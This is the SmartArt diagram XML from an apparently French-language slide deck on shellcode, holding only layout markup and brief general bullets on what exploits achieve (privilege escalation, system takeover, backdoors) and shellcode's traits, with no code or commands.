    <dgm:cxn modelId="{AE1196EA-FD6F-5840-8D9F-452A45771738}" type="presOf" srcId="{B8ADB5D6-64D2-4190-A580-1DA1B337B396}" destId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5C6CC54F-8E24-F74B-8799-67CDA6616823}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{D520B786-F344-CB48-A21C-6ECC92F4CAAB}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F53A3C32-9D96-9049-885D-58195989BFB3}" type="presParOf" srcId="{D520B786-F344-CB48-A21C-6ECC92F4CAAB}" destId="{2B9FE3B3-BFE5-524E-8CFA-DCE8BB57614A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{833E5FEC-724D-0C43-BAB8-32F7E6510268}" type="presParOf" srcId="{D520B786-F344-CB48-A21C-6ECC92F4CAAB}" destId="{473A0C19-D269-2943-9136-DEEE23465FEB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A659D166-F075-9B41-8246-11AEC632A5F5}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{427FDBCB-FF52-FF46-9295-20AD0A1CB3A7}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{10920165-D095-6E44-92F3-269221B53EFB}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{944CD979-6FE5-F343-AA7B-F62D0900C401}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{411CAADB-A3F6-264B-8D8B-E1D802B5A1AD}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{CEA8EF5B-E42D-DF4C-8CC9-58ACEAECD8D1}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{59F0BD06-41C8-7B4E-8977-65B36FCCC26F}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{ECB30EAA-1EDC-A24A-B219-1F2BE82B7CEC}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{724C0007-B604-E44B-9B9D-2A7F978F574F}" type="presParOf" srcId="{ECB30EAA-1EDC-A24A-B219-1F2BE82B7CEC}" destId="{B6C022FC-FB85-394E-BDD1-02B5D8F7E0E3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{3803116F-FC8D-2D45-803E-F0CAFA8A87A6}" type="presParOf" srcId="{ECB30EAA-1EDC-A24A-B219-1F2BE82B7CEC}" destId="{650A70BC-7F10-7745-84C2-70197B0C1977}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8FB77E56-9E91-BF44-837E-B7F063DC9AB2}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{2FF47E9E-790E-5146-8410-22C1D6834AC5}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0173AF3C-7CDB-DA44-AA6E-4026D6688A01}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{5C400156-2FCE-024D-A603-08723439D8AB}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{41816C57-1BC7-5749-BC49-12D65ECAA561}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{44655199-8BEF-A64C-A436-BE9B3735B12C}" srcOrd="7" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D0155D3C-8C52-ED4E-A8A4-FE5110812B4A}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{0E469557-4822-6A43-876B-7E872A36B7C2}" srcOrd="8" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D756C66B-19A9-624B-8892-3164387FAA53}" type="presParOf" srcId="{0E469557-4822-6A43-876B-7E872A36B7C2}" destId="{012A89E5-7DB6-004E-A924-798BE507926C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5AA15281-ABEC-264A-B81F-C31255F03C34}" type="presParOf" srcId="{0E469557-4822-6A43-876B-7E872A36B7C2}" destId="{4815005B-E46F-8A4A-A616-4252EB4CA96A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D02CB7BB-AC29-5347-A91B-D03A7F268A8F}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{F2594E6A-BC7A-E440-9169-B6C61C2CEA02}" srcOrd="9" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{606C920A-0F36-7646-9082-0FB911509FA2}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{22414C4A-4B00-B449-90BB-C0F320A8B717}" srcOrd="10" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7E169E68-7953-384F-992A-1CABD16D3C13}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{4466180E-AF49-B94E-A328-3C830164AC70}" srcOrd="11" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1331C16E-7591-2E40-AB36-34E1F610EB31}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{D1C7A627-BF91-D646-9922-2927E23239D0}" srcOrd="12" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{09B962A2-7AA9-2240-8DB0-707A23D5B70D}" type="presParOf" srcId="{D1C7A627-BF91-D646-9922-2927E23239D0}" destId="{F60C5BEC-53DF-5A44-935D-0E0DC462D19A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1B2E0200-C727-7D4F-8039-AF105F94576C}" type="presParOf" srcId="{D1C7A627-BF91-D646-9922-2927E23239D0}" destId="{C76993A6-1902-FD48-922E-AB28AC18A33A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{25F93C43-69C8-CA43-852D-D1EFB1784A90}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{711389F9-8538-6442-BBDA-9132A79972A7}" srcOrd="13" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4166EC48-02F8-4449-A5F3-A52FF6CD13DE}" type="presParOf" srcId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" destId="{7B3AE627-0078-BA40-BC40-705B21E3CD9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FA0BA7E5-0875-41C7-A71C-EF09FB60B528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8882F08-4376-494F-92EA-01DC12BCA4A0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Applications dans les exploits :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{968E8C57-A964-4D6C-B4C3-32EF5669BC9F}" type="parTrans" cxnId="{694FAF3D-964A-4218-B32F-E1F07FCC991B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B98DFE2A-6F66-4064-B6E3-4FE4FAAD1A87}" type="sibTrans" cxnId="{694FAF3D-964A-4218-B32F-E1F07FCC991B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1139831D-3DE3-44CE-8794-65E668ADA3C0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Élever les privilèges.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E6118ECD-A69F-4E8E-9FA9-02C4905D4953}" type="parTrans" cxnId="{C4404817-FC95-4D7A-AA2F-B44DBF6EEFB6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{62F31C97-355C-4B6E-8F61-25889DFCF002}" type="sibTrans" cxnId="{C4404817-FC95-4D7A-AA2F-B44DBF6EEFB6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8764F465-29BB-4B1A-9A1A-ACD564D3654B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Prendre le contrôle d’un système.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9295BA5F-A0C8-431B-95F0-63E3B4314CDB}" type="parTrans" cxnId="{AA4D29D4-5107-43CB-8322-DF52664794B8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{808C7C10-804A-4C0A-9754-E8450C02FD55}" type="sibTrans" cxnId="{AA4D29D4-5107-43CB-8322-DF52664794B8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FE3AB5F8-38DF-48FD-9FBA-60FC9F3F910B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Installer des backdoors.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{69B4F701-612F-482F-91F2-232202DDE85C}" type="parTrans" cxnId="{3D99AE9F-E778-4318-BA88-BFB07BFD21FE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{700AEE1F-A27F-49C2-8DFF-78E1BB4A60F5}" type="sibTrans" cxnId="{3D99AE9F-E778-4318-BA88-BFB07BFD21FE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{884809F7-E3D5-4466-891C-041E0D7EC76E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Atout des shellcodes :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{41BC0A74-5776-4DB5-9E23-A8CEAF8C3BD7}" type="parTrans" cxnId="{FACED337-EE0C-482C-8FF0-4CA96F032B0F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2992CDB5-A2CF-4AD9-81F9-ECA16B173168}" type="sibTrans" cxnId="{FACED337-EE0C-482C-8FF0-4CA96F032B0F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5C6C6581-E302-45A1-AFA5-398894D42DD3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" dirty="0"/>
            <a:t>Taille </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" dirty="0" err="1"/>
            <a:t>compacte</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" dirty="0"/>
            <a:t> (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" dirty="0" err="1"/>
            <a:t>ou</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" dirty="0"/>
            <a:t> pas).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" dirty="0"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FE32C8E8-154D-4483-8F8D-B77AA044BE16}" type="parTrans" cxnId="{490247C7-1350-401E-9A27-89BDC33396B0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2E769807-6AC8-4B5E-8C3B-E703D95A1020}" type="sibTrans" cxnId="{490247C7-1350-401E-9A27-89BDC33396B0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BD3A5F71-039C-4117-BF46-BFBE45DEC0B6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Peut contourner des protections en restant furtif.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B14C016F-FE86-4DE0-AFE0-CF676550BEA2}" type="parTrans" cxnId="{A214C81F-6B42-417A-8742-D9AE71BF09D0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DC9A8619-FA87-496C-ADE3-848C38EAF899}" type="sibTrans" cxnId="{A214C81F-6B42-417A-8742-D9AE71BF09D0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8A5FD83B-C4FB-0340-9784-C0C35AB90B9F}" type="pres">
      <dgm:prSet presAssocID="{FA0BA7E5-0875-41C7-A71C-EF09FB60B528}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{AA54F2F6-2793-DE4A-AB2C-0163EB1E30E0}" type="pres">
      <dgm:prSet presAssocID="{28882F08-4376-494F-92EA-01DC12BCA4A0}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FA0CA046-F2A3-564C-BAD4-3B5470BED26D}" type="pres">
      <dgm:prSet presAssocID="{28882F08-4376-494F-92EA-01DC12BCA4A0}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DE8445C9-EF95-4949-A860-85F6488F9F49}" type="pres">
      <dgm:prSet presAssocID="{28882F08-4376-494F-92EA-01DC12BCA4A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65A0855-759E-3340-8FD4-17B29A6A5D09}" type="pres">
      <dgm:prSet presAssocID="{28882F08-4376-494F-92EA-01DC12BCA4A0}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{BF1DEAD1-BD63-324C-A695-5E4D2BDA2819}" type="pres">
      <dgm:prSet presAssocID="{28882F08-4376-494F-92EA-01DC12BCA4A0}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B050ED04-D60C-F645-ACAA-58F15E032295}" type="pres">
      <dgm:prSet presAssocID="{B98DFE2A-6F66-4064-B6E3-4FE4FAAD1A87}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CAB35738-D527-5C4B-BD86-9DD1A0312070}" type="pres">
      <dgm:prSet presAssocID="{884809F7-E3D5-4466-891C-041E0D7EC76E}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7CE94A4C-7926-2A4D-B37E-D9D13EC904AE}" type="pres">
      <dgm:prSet presAssocID="{884809F7-E3D5-4466-891C-041E0D7EC76E}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8822A204-797B-8443-89B7-C370F8E044DF}" type="pres">
      <dgm:prSet presAssocID="{884809F7-E3D5-4466-891C-041E0D7EC76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C985FE9-06AB-CD4C-B9DF-B9DC95E91025}" type="pres">
      <dgm:prSet presAssocID="{884809F7-E3D5-4466-891C-041E0D7EC76E}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B943E213-DD8B-5748-8DE3-6066FB954A5C}" type="pres">
      <dgm:prSet presAssocID="{884809F7-E3D5-4466-891C-041E0D7EC76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3642D0C-0234-BF4B-B6FB-1FE8BDA544A8}" type="presOf" srcId="{28882F08-4376-494F-92EA-01DC12BCA4A0}" destId="{DE8445C9-EF95-4949-A860-85F6488F9F49}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C4404817-FC95-4D7A-AA2F-B44DBF6EEFB6}" srcId="{28882F08-4376-494F-92EA-01DC12BCA4A0}" destId="{1139831D-3DE3-44CE-8794-65E668ADA3C0}" srcOrd="0" destOrd="0" parTransId="{E6118ECD-A69F-4E8E-9FA9-02C4905D4953}" sibTransId="{62F31C97-355C-4B6E-8F61-25889DFCF002}"/>
    <dgm:cxn modelId="{A214C81F-6B42-417A-8742-D9AE71BF09D0}" srcId="{884809F7-E3D5-4466-891C-041E0D7EC76E}" destId="{BD3A5F71-039C-4117-BF46-BFBE45DEC0B6}" srcOrd="1" destOrd="0" parTransId="{B14C016F-FE86-4DE0-AFE0-CF676550BEA2}" sibTransId="{DC9A8619-FA87-496C-ADE3-848C38EAF899}"/>
    <dgm:cxn modelId="{CF70E931-BC81-204A-8A0C-FE518EE76C3A}" type="presOf" srcId="{FE3AB5F8-38DF-48FD-9FBA-60FC9F3F910B}" destId="{BF1DEAD1-BD63-324C-A695-5E4D2BDA2819}" srcOrd="0" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{FACED337-EE0C-482C-8FF0-4CA96F032B0F}" srcId="{FA0BA7E5-0875-41C7-A71C-EF09FB60B528}" destId="{884809F7-E3D5-4466-891C-041E0D7EC76E}" srcOrd="1" destOrd="0" parTransId="{41BC0A74-5776-4DB5-9E23-A8CEAF8C3BD7}" sibTransId="{2992CDB5-A2CF-4AD9-81F9-ECA16B173168}"/>
    <dgm:cxn modelId="{694FAF3D-964A-4218-B32F-E1F07FCC991B}" srcId="{FA0BA7E5-0875-41C7-A71C-EF09FB60B528}" destId="{28882F08-4376-494F-92EA-01DC12BCA4A0}" srcOrd="0" destOrd="0" parTransId="{968E8C57-A964-4D6C-B4C3-32EF5669BC9F}" sibTransId="{B98DFE2A-6F66-4064-B6E3-4FE4FAAD1A87}"/>
    <dgm:cxn modelId="{B2B08754-66E9-8647-B42B-3E1CBEA2C935}" type="presOf" srcId="{28882F08-4376-494F-92EA-01DC12BCA4A0}" destId="{FA0CA046-F2A3-564C-BAD4-3B5470BED26D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8B0EEE71-F8C9-134A-84CB-681B7836749B}" type="presOf" srcId="{884809F7-E3D5-4466-891C-041E0D7EC76E}" destId="{8822A204-797B-8443-89B7-C370F8E044DF}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{BF95C594-3AF9-FE49-BA61-1069AD577F46}" type="presOf" srcId="{884809F7-E3D5-4466-891C-041E0D7EC76E}" destId="{7CE94A4C-7926-2A4D-B37E-D9D13EC904AE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DFC1769F-FAC5-7D4D-872B-1838DB536BB0}" type="presOf" srcId="{5C6C6581-E302-45A1-AFA5-398894D42DD3}" destId="{B943E213-DD8B-5748-8DE3-6066FB954A5C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{3D99AE9F-E778-4318-BA88-BFB07BFD21FE}" srcId="{28882F08-4376-494F-92EA-01DC12BCA4A0}" destId="{FE3AB5F8-38DF-48FD-9FBA-60FC9F3F910B}" srcOrd="2" destOrd="0" parTransId="{69B4F701-612F-482F-91F2-232202DDE85C}" sibTransId="{700AEE1F-A27F-49C2-8DFF-78E1BB4A60F5}"/>
    <dgm:cxn modelId="{EB35EFB8-8FB1-0840-8D53-F0ABC0D45C22}" type="presOf" srcId="{8764F465-29BB-4B1A-9A1A-ACD564D3654B}" destId="{BF1DEAD1-BD63-324C-A695-5E4D2BDA2819}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{490247C7-1350-401E-9A27-89BDC33396B0}" srcId="{884809F7-E3D5-4466-891C-041E0D7EC76E}" destId="{5C6C6581-E302-45A1-AFA5-398894D42DD3}" srcOrd="0" destOrd="0" parTransId="{FE32C8E8-154D-4483-8F8D-B77AA044BE16}" sibTransId="{2E769807-6AC8-4B5E-8C3B-E703D95A1020}"/>
    <dgm:cxn modelId="{360135CD-4721-3B47-9CD2-BA7D7AB99124}" type="presOf" srcId="{FA0BA7E5-0875-41C7-A71C-EF09FB60B528}" destId="{8A5FD83B-C4FB-0340-9784-C0C35AB90B9F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AA4D29D4-5107-43CB-8322-DF52664794B8}" srcId="{28882F08-4376-494F-92EA-01DC12BCA4A0}" destId="{8764F465-29BB-4B1A-9A1A-ACD564D3654B}" srcOrd="1" destOrd="0" parTransId="{9295BA5F-A0C8-431B-95F0-63E3B4314CDB}" sibTransId="{808C7C10-804A-4C0A-9754-E8450C02FD55}"/>
    <dgm:cxn modelId="{874178E0-CCC7-D449-8ECD-8543EA319C35}" type="presOf" srcId="{1139831D-3DE3-44CE-8794-65E668ADA3C0}" destId="{BF1DEAD1-BD63-324C-A695-5E4D2BDA2819}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6F04B7F4-22A9-6D41-890D-A9C0D3573E1D}" type="presOf" srcId="{BD3A5F71-039C-4117-BF46-BFBE45DEC0B6}" destId="{B943E213-DD8B-5748-8DE3-6066FB954A5C}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F11E2F18-3B8C-7744-8EF6-E0D71C083A36}" type="presParOf" srcId="{8A5FD83B-C4FB-0340-9784-C0C35AB90B9F}" destId="{AA54F2F6-2793-DE4A-AB2C-0163EB1E30E0}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C5D84AD0-5134-E04F-957E-8C6EA235ACFA}" type="presParOf" srcId="{AA54F2F6-2793-DE4A-AB2C-0163EB1E30E0}" destId="{FA0CA046-F2A3-564C-BAD4-3B5470BED26D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{BB506D52-532E-724D-AAD2-D35265D5E627}" type="presParOf" srcId="{AA54F2F6-2793-DE4A-AB2C-0163EB1E30E0}" destId="{DE8445C9-EF95-4949-A860-85F6488F9F49}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2C0DB920-EE6A-E84E-B254-FB6A6B5F0E64}" type="presParOf" srcId="{8A5FD83B-C4FB-0340-9784-C0C35AB90B9F}" destId="{265A0855-759E-3340-8FD4-17B29A6A5D09}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E3665587-9E27-9B4B-9597-93807505B8EB}" type="presParOf" srcId="{8A5FD83B-C4FB-0340-9784-C0C35AB90B9F}" destId="{BF1DEAD1-BD63-324C-A695-5E4D2BDA2819}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B151EDFE-5068-3642-9B67-E3B65E94A579}" type="presParOf" srcId="{8A5FD83B-C4FB-0340-9784-C0C35AB90B9F}" destId="{B050ED04-D60C-F645-ACAA-58F15E032295}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1CF2B441-0E41-1147-BA32-978970FB703D}" type="presParOf" srcId="{8A5FD83B-C4FB-0340-9784-C0C35AB90B9F}" destId="{CAB35738-D527-5C4B-BD86-9DD1A0312070}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0CE1ED4A-BA88-4E4C-803E-6D345BE9E585}" type="presParOf" srcId="{CAB35738-D527-5C4B-BD86-9DD1A0312070}" destId="{7CE94A4C-7926-2A4D-B37E-D9D13EC904AE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DF270184-DE1D-EC44-B07B-8770412530F8}" type="presParOf" srcId="{CAB35738-D527-5C4B-BD86-9DD1A0312070}" destId="{8822A204-797B-8443-89B7-C370F8E044DF}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{646E0CE9-CD33-D048-AE88-20A4F0C548C3}" type="presParOf" srcId="{8A5FD83B-C4FB-0340-9784-C0C35AB90B9F}" destId="{8C985FE9-06AB-CD4C-B9DF-B9DC95E91025}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{38277FFB-6C08-384A-9DD3-D2DCBA55EA25}" type="presParOf" srcId="{8A5FD83B-C4FB-0340-9784-C0C35AB90B9F}" destId="{B943E213-DD8B-5748-8DE3-6066FB954A5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D8A4584A-4AFF-41AD-A916-32A540C4BD6A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6F561CA-C8F1-4CFC-B8CE-8175F41E695F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>1. Shellcode local :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
